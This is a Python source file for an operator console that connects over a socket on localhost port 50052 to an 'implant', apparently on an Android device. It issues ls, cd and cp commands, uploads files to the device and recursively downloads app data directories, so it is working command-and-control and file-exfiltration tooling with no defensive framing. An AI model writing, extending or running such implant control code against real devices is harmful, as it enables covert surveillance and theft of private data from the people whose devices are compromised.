import socket
import sys

def copy_directory(sock, remote_dir, local_dir, direction):
    """Recursively copy directory"""
    import os
    os.makedirs(local_dir, exist_ok=True)
    
    # Get directory listing
    sock.sendall(f"ls {remote_dir}\n".encode())
    response = b""
    while True:
        data = sock.recv(1024)
        if not data:
            break
        response += data
        if b'\x00' in response:
            break
    content = response.decode().rstrip('\x00')
    
    if "Error" in content:
        print(f"Cannot list directory {remote_dir}: {content}")
        return
    
    items = content.split('\n')
    
    for item in items:
        item = item.strip()
        if not item or item in ['.', '..', 'files', 'app_webview', 'shared_prefs', 'lib', 'app_textures', 'code_cache', 'databases', 'cache', 'no_backup']:
            continue
        
        remote_path = f"{remote_dir}/{item}"
        local_path = f"{local_dir}/{item}"
        
        # Try to copy as file first
        print(f"Trying to copy {remote_path}...")
        sock.sendall(f"cp {remote_path} {local_path} {direction}\n".encode())
        if direction == "download":
            try:
                size_data = sock.recv(8)  # off_t is 8 bytes on 64-bit Android
                size = int.from_bytes(size_data, byteorder='little')
                print(f"Size for {remote_path}: {size}")
                if size > 0:
                    data = b""
                    while len(data) < size:
                        chunk = sock.recv(min(1024, size - len(data)))
                        if not chunk:
                            break
                        data += chunk
                    with open(local_path, 'wb') as f:
                        f.write(data)
                    print(f"Copied file {remote_path} to {local_path}")
                elif size == 0:
                    # It's a directory, copy recursively
                    print(f"{remote_path} is a directory, recursing...")
                    copy_directory(sock, remote_path, local_path, direction)
                else:
                    print(f"Skipping {remote_path} (negative size)")
            except Exception as e:
                print(f"Error copying {remote_path}: {e}")

def main():
    host = 'localhost'
    port = 50052

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        sock.settimeout(10)  # Add timeout to prevent hanging
        print("Connected to implant. Type commands: ls [path], cd <path>, cp <src> <dst> <upload|download>, exit")
        
        while True:
            cmd = input("> ").strip()
            if not cmd:
                continue
            if cmd == "exit":
                break
            parts = cmd.split()
            command = parts[0]
            
            if command == "ls":
                path = "." if len(parts) == 1 else parts[1]
                if path == ".":
                    path = "/"  # Default to root directory
                sock.sendall(f"ls {path}\n".encode())
                response = b""
                while True:
                    data = sock.recv(1024)
                    if not data:
                        break
                    response += data
                    if b'\x00' in response:
                        break
                print(response.decode().rstrip('\x00'))
            
            elif command == "cd":
                if len(parts) < 2:
                    print("Usage: cd <path>")
                    continue
                path = parts[1]
                sock.sendall(f"cd {path}\n".encode())
                response = b""
                while True:
                    data = sock.recv(1024)
                    if not data:
                        break
                    response += data
                    if b'\x00' in response:
                        break
                print(response.decode().rstrip('\x00'))
            
            elif command == "cp":
                if len(parts) < 4:
                    print("Usage: cp <src> <dst> <upload|download>")
                    continue
                src = parts[1]
                dst = parts[2]
                direction = parts[3]
                if direction not in ["upload", "download"]:
                    print("Direction must be 'upload' or 'download'")
                    continue
                
                # Сначала попробуем как файл
                sock.sendall(f"cp {src} {dst} {direction}\n".encode())
                if direction == "upload":
                    # Send file to implant
                    try:
                        with open(src, 'rb') as f:
                            data = f.read()
                            size = len(data)
                            sock.sendall(size.to_bytes(4, byteorder='little'))
                            sock.sendall(data)
                            response = sock.recv(1024).decode().strip()
                            print(response)
                    except Exception as e:
                        print(f"Error uploading file: {e}")
                elif direction == "download":
                    # Receive file from implant
                    try:
                        size_data = sock.recv(8)  # off_t is 8 bytes on 64-bit Android
                        size = int.from_bytes(size_data, byteorder='little')
                        if size > 0:
                            data = b""
                            while len(data) < size:
                                chunk = sock.recv(min(1024, size - len(data)))
                                if not chunk:
                                    break
                                data += chunk
                            with open(dst, 'wb') as f:
                                f.write(data)
                            print(f"Downloaded file {size} bytes to {dst}")
                        else:
                            # Возможно, это директория, попробуем скопировать все файлы из неё
                            print(f"{src} appears to be a directory, copying all files from it...")
                            copy_directory(sock, src, dst, direction)
                    except Exception as e:
                        print(f"Error downloading: {e}")
            
            else:
                print("Unknown command")
        
        sock.close()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()